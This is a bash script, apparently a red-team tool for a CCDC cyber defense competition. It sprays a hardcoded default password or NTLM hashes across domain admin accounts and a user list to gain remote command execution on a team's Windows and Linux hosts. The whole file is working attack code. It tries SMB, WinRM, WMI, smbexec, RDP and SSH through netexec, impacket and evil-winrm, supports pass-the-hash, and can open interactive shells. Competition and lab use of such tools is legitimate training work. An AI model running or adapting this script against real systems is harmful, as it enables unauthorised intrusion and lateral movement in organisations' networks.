#!/bin/bash
# ================================================
# CCDC Remote Exec Script
# Usage: ./exec.sh <team> [host] [-c "command"] [-p pass_or_hash] [-s] [-x]
#
#   host  → hostname (curiosity), number (1-7), or omit to list
#   -c    → command to run (default: whoami /all)
#   -p    → password or NTLM hash (default: Th3cake1salie!)
#   -s    → shell mode: drop into interactive shell on first hit
#   -x    → use internal 172.16.x.x IPs (proxychains/pivot mode)
#
#   Tries DA accounts first, then falls back to all users in users.txt
#   Order: SMB → WinRM → WMI → smbexec → RDP → SSH
#   WMI: tries domain auth; falls back to local auth if SMB port closed
# ================================================

usage() {
  echo "Usage: $0 <team> [host] [-c \"command\"] [-p password_or_hash] [-s] [-x]"
  echo ""
  echo "  host can be:"
  echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
  echo "    number    — 1=curiosity 2=morality 3=intelligence 4=anger 5=fact 6=space 7=adventure"
  echo ""
  echo "Flags:"
  echo "  -c CMD   command to run remotely (default: whoami /all)"
  echo "  -p PASS  password or NTLM hash"
  echo "  -s       shell mode — drop into interactive shell on first successful auth"
  echo "  -x       use internal 172.16.x.x IPs (for proxychains pivot)"
  echo ""
  echo "Examples:"
  echo "  $0 5                               # list all boxes"
  echo "  $0 5 1                             # whoami on curiosity (DC)"
  echo "  $0 5 anger -c \"ipconfig\""
  echo "  $0 5 3 -c \"net user\" -p Th3cake1salie!"
  echo "  $0 5 curiosity -s                  # drop into shell"
  echo "  $0 5 -x curiosity                  # use internal IP via proxychains"
  exit 1
}

# ====================== PARSE ARGS ======================
if [[ $# -lt 1 ]]; then usage; fi

TEAM="$1"; shift
if [[ -z "$TEAM" || ! "$TEAM" =~ ^[0-9]+$ ]]; then usage; fi

DOMAIN="aperturesciencelabs.org"
PASS="Th3cake1salie!"
CMD="whoami /all"
SHELL_MODE=0
USE_INTERNAL=0
TARGET_ARG=""

# Grab optional positional host arg (before any flags)
if [[ $# -gt 0 && "$1" != -* ]]; then
  TARGET_ARG="$1"; shift
fi

while getopts "p:c:sx" opt; do
  case "$opt" in
    p) PASS="$OPTARG" ;;
    c) CMD="$OPTARG" ;;
    s) SHELL_MODE=1 ;;
    x) USE_INTERNAL=1 ;;
    *) usage ;;
  esac
done

# In shell mode use a harmless probe so try_* functions still verify auth
if [[ $SHELL_MODE -eq 1 ]]; then
  CMD="echo __probe__"
fi

# ====================== HOST MAPPING ======================
# Number → hostname
declare -A NUM_HOST=(
  [1]="curiosity"
  [2]="morality"
  [3]="intelligence"
  [4]="anger"
  [5]="fact"
  [6]="space"
  [7]="adventure"
)

# Hostname → last octet (external)
declare -A HOST_OCTET=(
  ["curiosity"]=140
  ["morality"]=10
  ["intelligence"]=11
  ["anger"]=70
  ["fact"]=71
  ["space"]=141
  ["adventure"]=72
)

# Hostname → internal IP (172.16.x.x)
declare -A HOST_INTERNAL=(
  ["curiosity"]="172.16.3.140"
  ["morality"]="172.16.1.10"
  ["intelligence"]="172.16.1.11"
  ["anger"]="172.16.2.70"
  ["fact"]="172.16.2.71"
  ["space"]="172.16.3.141"
  ["adventure"]="172.16.2.72"
)

HOST_ORDER=(curiosity morality intelligence anger fact space adventure)
HOST_DESC=(
  "1) curiosity     (.140) — DC"
  "2) morality      (.10)"
  "3) intelligence  (.11)"
  "4) anger         (.70)"
  "5) fact          (.71)"
  "6) space         (.141)"
  "7) adventure     (.72)"
)

# ====================== RESOLVE TARGET ======================
if [[ -z "$TARGET_ARG" ]]; then
  echo "[+] Team ${TEAM} — Available hosts:"
  for desc in "${HOST_DESC[@]}"; do
    local_host="${HOST_ORDER[$((${desc:0:1}-1))]}"
    if [[ $USE_INTERNAL -eq 1 ]]; then
      ip="${HOST_INTERNAL[$local_host]}"
    else
      ip="192.168.20${TEAM}.${HOST_OCTET[$local_host]}"
    fi
    printf "    %s  [%s]\n" "$desc" "$ip"
  done
  echo ""
  echo "Re-run with a host number (1-7) or hostname to execute."
  exit 0
fi

# Resolve number → hostname
if [[ "$TARGET_ARG" =~ ^[1-7]$ ]]; then
  HOSTNAME="${NUM_HOST[$TARGET_ARG]}"
elif [[ -n "${HOST_OCTET[$TARGET_ARG]}" ]]; then
  HOSTNAME="$TARGET_ARG"
else
  echo "[-] Unknown host: '$TARGET_ARG'"
  echo "    Use a number 1-7 or one of: ${HOST_ORDER[*]}"
  exit 1
fi

LAST_OCTET="${HOST_OCTET[$HOSTNAME]}"
if [[ $USE_INTERNAL -eq 1 ]]; then
  IP="${HOST_INTERNAL[$HOSTNAME]}"
else
  IP="192.168.20${TEAM}.${LAST_OCTET}"
fi
FQDN="${HOSTNAME}.${DOMAIN}"

# ====================== AUTH FLAGS ======================
# Accepts: plain password, NT hash (32 hex), or LM:NT pair
if [[ "$PASS" =~ ^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$ ]]; then
  AUTH_FLAG="-H"
  echo "[+] Auth: LM:NT hash"
elif [[ "$PASS" =~ ^[0-9a-fA-F]{32}$ ]]; then
  AUTH_FLAG="-H"
  echo "[+] Auth: NT hash"
else
  AUTH_FLAG="-p"
  echo "[+] Auth: password"
fi

# ====================== BUILD USER LIST ======================
# DA accounts take priority, then anything else in users.txt
DA_USERS=(Administrator caroline cave chell glados wheatley)

USERS_FILE="users.txt"
ALL_USERS=()

# Add DAs first
for u in "${DA_USERS[@]}"; do
  ALL_USERS+=("$u")
done

# Append users.txt entries not already in the list
if [[ -f "$USERS_FILE" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && ALL_USERS+=("$u")
  done < "$USERS_FILE"
else
  echo "[!] users.txt not found — using DA list only"
fi

# ====================== PORT PRE-CHECK ======================
TIMEOUT=2
port_open() {
  local ip="$1" port="$2"
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
}

SMB_UP=0
if port_open "$IP" 445; then
  SMB_UP=1
fi

echo "[+] Target : ${FQDN} (${IP})"
if [[ $SHELL_MODE -eq 1 ]]; then
  echo "[+] Mode   : SHELL (interactive)"
else
  echo "[+] Command: ${CMD}"
fi
echo "[+] SMB    : $([ $SMB_UP -eq 1 ] && echo 'open' || echo 'closed')"
echo "[+] Users  : ${#ALL_USERS[@]} total (${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]})) from users.txt)"
echo ""

# ====================== SHELL OPENER ======================
# Called in shell mode after a protocol auth succeeds.
# Uses exec so the process is replaced by the interactive session.
# Returns 1 if the required binary is missing (caller can try next proto).
open_shell() {
  local proto="$1" user="$2"
  echo "[*] Opening $proto shell as $user on ${FQDN} ..."
  case "$proto" in
    winrm)
      if command -v evil-winrm >/dev/null 2>&1; then
        if [[ "$AUTH_FLAG" == "-H" ]]; then
          exec evil-winrm -i "$IP" -u "$user" -H "$PASS"
        else
          exec evil-winrm -i "$IP" -u "$user" -p "$PASS"
        fi
      fi
      echo "[-] evil-winrm not found — skipping WinRM shell"
      return 1
      ;;
    smb)
      local psexec_bin
      psexec_bin=$(command -v psexec.py 2>/dev/null || command -v impacket-psexec 2>/dev/null || echo "")
      if [[ -n "$psexec_bin" ]]; then
        if [[ "$AUTH_FLAG" == "-H" ]]; then
          exec "$psexec_bin" "${DOMAIN}/${user}@${FQDN}" -hashes "$PASS" -dc-ip "$IP" -target-ip "$IP"
        else
          exec "$psexec_bin" "${DOMAIN}/${user}:${PASS}@${FQDN}" -dc-ip "$IP" -target-ip "$IP"
        fi
      fi
      echo "[-] psexec not found — skipping SMB shell"
      return 1
      ;;
    wmi)
      local wmiexec_bin
      wmiexec_bin=$(command -v wmiexec.py 2>/dev/null || command -v impacket-wmiexec 2>/dev/null || echo "")
      if [[ -n "$wmiexec_bin" ]]; then
        if [[ "$AUTH_FLAG" == "-H" ]]; then
          exec "$wmiexec_bin" "${DOMAIN}/${user}@${FQDN}" -hashes "$PASS" -dc-ip "$IP" -target-ip "$IP"
        else
          exec "$wmiexec_bin" "${DOMAIN}/${user}:${PASS}@${FQDN}" -dc-ip "$IP" -target-ip "$IP"
        fi
      fi
      echo "[-] wmiexec not found — skipping WMI shell"
      return 1
      ;;
    rdp)
      if command -v xfreerdp >/dev/null 2>&1; then
        exec xfreerdp /v:"$IP" /u:"$user" /d:"$DOMAIN" /p:"$PASS" \
          +clipboard /dynamic-resolution /cert:ignore 2>/dev/null
      fi
      echo "[-] xfreerdp not found — skipping RDP shell"
      return 1
      ;;
    ssh)
      exec ssh -o StrictHostKeyChecking=no "${user}@${IP}"
      ;;
  esac
}

# ====================== EXEC FUNCTIONS ======================
# Each returns 0 on success, 1 on failure

try_winrm() {
  local user="$1"
  local out
  out=$(netexec winrm "$IP" \
    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
    -x "$CMD" 2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] WinRM SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi
  return 1
}

try_smb_x() {
  local user="$1"
  local out
  # netexec smb -x runs cmd.exe commands
  out=$(netexec smb "$IP" \
    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
    -x "powershell.exe -NoP -NonI -c \"${CMD}\"" 2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] SMB(cmd) SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi
  return 1
}

try_smbexec() {
  local user="$1"
  local smbexec_bin
  smbexec_bin=$(command -v smbexec.py 2>/dev/null || command -v impacket-smbexec 2>/dev/null || echo "")
  [[ -z "$smbexec_bin" ]] && return 1

  local out
  if [[ "$AUTH_FLAG" == "-H" ]]; then
    out=$("$smbexec_bin" "${DOMAIN}/${user}@${FQDN}" \
      -hashes "${PASS}" -dc-ip "$IP" -target-ip "$IP" \
      -c "$CMD" 2>&1)
  else
    out=$("$smbexec_bin" "${DOMAIN}/${user}:${PASS}@${FQDN}" \
      -dc-ip "$IP" -target-ip "$IP" \
      -c "$CMD" 2>&1)
  fi
  if echo "$out" | grep -qiv 'error\|failed\|refused\|denied'; then
    echo "[+] smbexec SUCCESS → $user"
    echo "$out"
    return 0
  fi
  return 1
}

try_wmi() {
  local user="$1"
  local out

  # 1) Try domain auth first
  out=$(netexec wmi "$IP" \
    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
    -x "$CMD" 2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] WMI(domain) SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi

  # 2) If SMB is down, also try local auth (no domain / --local-auth)
  if [[ $SMB_UP -eq 0 ]]; then
    out=$(netexec wmi "$IP" \
      -u "$user" "$AUTH_FLAG" "$PASS" \
      --local-auth \
      -x "$CMD" 2>&1)
    if echo "$out" | grep -q '\[+\]'; then
      echo "[+] WMI(local) SUCCESS → $user"
      echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
      return 0
    fi
  fi

  return 1
}

try_rdp() {
  local user="$1"
  local out

  out=$(netexec rdp "$IP" \
    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
    2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] RDP SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi
  return 1
}

try_ssh() {
  local user="$1"
  # SSH only supports password auth here (no hash)
  if [[ "$AUTH_FLAG" == "-H" ]]; then
    return 1
  fi

  if ! port_open "$IP" 22; then
    return 1
  fi

  local out
  out=$(netexec ssh "$IP" \
    -u "$user" -p "$PASS" \
    -x "$CMD" 2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] SSH SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi
  return 1
}

# ====================== MAIN LOOP ======================
SUCCESS=0

try_and_maybe_shell() {
  local proto="$1" user="$2"
  local fn="try_${proto//-/_}"

  if $fn "$user"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell "$proto" "$user" || return 1  # binary missing — keep trying
    fi
    return 0
  fi
  return 1
}

for USER in "${ALL_USERS[@]}"; do
  printf "[*] %-20s " "$USER"

  # 1. SMB
  if try_smb_x "$USER"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell smb "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
    fi
    [[ $SUCCESS -eq 1 ]] && break
  fi

  # 2. WinRM
  if try_winrm "$USER"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell winrm "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
    fi
    [[ $SUCCESS -eq 1 ]] && break
  fi

  # 3. WMI (domain + local auth fallback)
  if try_wmi "$USER"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell wmi "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
    fi
    [[ $SUCCESS -eq 1 ]] && break
  fi

  # 4. smbexec (impacket)
  if try_smbexec "$USER"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell smb "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
    fi
    [[ $SUCCESS -eq 1 ]] && break
  fi

  # 5. RDP
  if try_rdp "$USER"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell rdp "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
    fi
    [[ $SUCCESS -eq 1 ]] && break
  fi

  # 6. SSH
  if try_ssh "$USER"; then
    SUCCESS=1
    if [[ $SHELL_MODE -eq 1 ]]; then
      open_shell ssh "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
    fi
    [[ $SUCCESS -eq 1 ]] && break
  fi

  echo "→ no access"
done

echo ""
if [[ $SUCCESS -eq 0 ]]; then
  echo "[-] No credentials worked on ${FQDN} (${IP})"
  echo "    Check: VPN up? Host reachable? (ping ${IP})"
fi